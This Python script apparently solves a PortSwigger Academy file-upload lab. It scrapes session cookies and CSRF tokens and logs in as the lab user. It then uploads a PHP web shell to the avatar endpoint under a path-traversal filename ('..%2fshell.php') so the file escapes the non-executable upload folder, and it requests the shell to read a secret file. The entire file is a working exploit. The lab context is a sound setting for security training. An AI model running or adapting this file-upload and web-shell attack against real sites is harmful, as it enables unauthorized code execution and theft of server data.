import requests
import sys
import urllib3
import re
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}

def get_session_cookie_and_csrf_token(url):
    uri = "/login"
    r = requests.get(url + uri, verify=False, proxies=proxies)
    session_cookie = r.cookies.get_dict()['session']
    soup = BeautifulSoup(r.text, "html.parser")
    csrf_token = str(soup.find("input")["value"])
    return session_cookie,csrf_token

def get_authenticated_session_cookie_and_csrf_token(url, session_cookie, csrf_token):
    uri = "/login"
    cookies = {'session' : session_cookie}
    params = {'csrf' : csrf_token, 'username' : 'wiener', 'password' : 'peter'}
    r = requests.post(url + uri, cookies=cookies, data=params, verify=False, allow_redirects=False, proxies=proxies)
    authenticated_session_cookie = r.cookies.get_dict()['session']

    uri = "/my-account"
    cookies = {'session' : authenticated_session_cookie}
    r = requests.get(url + uri, cookies=cookies, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, "html.parser")
    s = soup.findAll("input")
    csrf_token = re.search(r"[a-z,A-Z,0-9]{32}", str(s)).group(0)
    return authenticated_session_cookie,csrf_token


def upload_file(url, authenticated_session_cookie, csrf_token):
    uri = "/my-account/avatar"
    cookies = {'session' : authenticated_session_cookie}
    params = {'csrf' : csrf_token, 'user' : 'wiener'}
    files = {'avatar' : ('..%2fshell.php', open(r"C:\Users\acalarco\csec\web-pentest\portswigger-academy\file-upload\shell-lab01.php"))}
    r = requests.post(url + uri, cookies=cookies, data=params, files=files, verify=False, proxies=proxies)
    if r.status_code == 200 and "../shell.php has been uploaded" in r.text:
        return True
    else:
        return False
    

def get_secret(url):
    uri = "/files/shell.php"
    r = requests.get(url + uri, verify=False, proxies=proxies)
    return r.text



def main():
    if len(sys.argv) != 2:
        print("[-] Usage: {0} <url>\n[-] Example: {1} www.example.com".format(sys.argv[0], sys.argv[0]))
        sys.exit(-1)
        
    url = sys.argv[1]
    print("[+] Testing for a 'File Upload Vulnerability' in the avatar upload function for logged-in users\n")
    print("[+] Let's start fetching a session cookie and a csrf token browsing to /login")
    session_cookie,csrf_token = get_session_cookie_and_csrf_token(url)
    print("[+] The session cookie is {0} while the csrf token is {1}\n".format(session_cookie, csrf_token))
    authenticated_session_cookie,csrf_token = get_authenticated_session_cookie_and_csrf_token(url, session_cookie, csrf_token)
    print("[+] Sending a POST request to /login as user wiener and fetching a 'logged-in' session cookie which is {0} and a new csrf token which is {1} from /my-account\n".format(authenticated_session_cookie,csrf_token))
    print(r"[+] Sending now a POST request to /my-account/avatar properly modified to include the payload '..%2fshell.php' in the 'filename' parameter")
    if not upload_file(url, authenticated_session_cookie, csrf_token):
        print("[-] Upload failed")
        sys.exit(-1)
    print("[+] Upload successul!!!!\n")
    secret = get_secret(url)
    print("[+] Fetching content of the file /home/carlos/secret... %s " % secret)



if __name__ == "__main__":
    main()